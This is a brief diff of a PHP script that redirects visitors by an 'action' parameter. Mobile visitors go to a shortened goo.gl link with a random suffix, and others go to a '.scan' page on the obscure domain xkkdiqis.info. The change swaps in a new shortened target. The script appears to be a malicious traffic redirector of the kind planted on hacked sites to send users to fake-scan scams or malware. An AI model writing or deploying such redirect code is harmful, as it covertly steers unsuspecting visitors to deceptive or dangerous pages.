@@ -115,7 +115,7 @@
   $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
 
   if($action == 'mobile'){
-    header('Location: https://goo.gl/Fjma8Y?'.rand(11111,99999));
+    header('Location: https://goo.gl/7WWmXZ?'.rand(11111,99999));
   }else if($action == 'site'){
     header("Location: http://xkkdiqis.info/$id.scan");
   }else{
